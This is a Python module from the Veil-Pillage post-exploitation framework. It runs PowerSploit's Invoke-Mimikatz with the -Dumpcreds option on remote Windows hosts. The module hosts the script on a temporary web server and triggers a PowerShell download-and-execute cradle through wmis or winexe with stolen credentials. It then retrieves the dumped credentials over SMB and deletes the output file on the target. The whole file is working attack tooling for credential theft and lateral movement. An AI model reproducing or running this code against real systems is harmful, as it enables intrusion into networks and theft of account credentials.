"""

Execute PowerSploit's CodeExecution/Invoke-Mimikatz.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/


Module built by @harmj0y

"""

import time

import settings
from lib import delivery_methods
from lib import helpers
from lib import smb


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-Mimikatz"
        self.description = ("Execute PowerSploit's Invoke-Mimikatz module on a host. "
                            "This will load the mimikatz .dll straight into memory.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "delay"             :   ["10", "delay (in seconds) before grabbing the results file"],
                                    "lhost"             :   ["", "lhost for hosting"],
                                    "out_file"          :   ["sys32.out", "temporary output filename used"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        triggerMethod = self.required_options["trigger_method"][0]
        delay = self.required_options["delay"][0]
        out_file = self.required_options["out_file"][0]

        # the temporary output file gpp-password will write to
        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        # path to the PowerSploit Invoke-Mimikatz.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Invoke-Mimikatz.ps1"
       
        # Mimikatz command to run
        scriptArguments = "Invoke-Mimikatz -Dumpcreds"

        # trigger the powershell download on all targets
        #   ignore the architecture-independent cradle
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, triggerMethod=triggerMethod, outFile=out_file, ssl=use_ssl, noArch=True)

        print "\n [*] Waiting "+delay+"s for Mimikatz to run..."
        time.sleep(int(delay))

        for target in self.targets:

            # grab the output file and delete it
            out = smb.getFile(target, username, password, out_file, delete=True)

            if out != "":
                # save the file off to the appropriate location
                saveFile = helpers.saveModuleFile(self, target, "mimikatz.txt", out)
                self.output += "[*] Powersploit:Invoke-Mimikatz results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
            else:
                self.output += "[!] Powersploit:Invoke-Mimikatz failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"
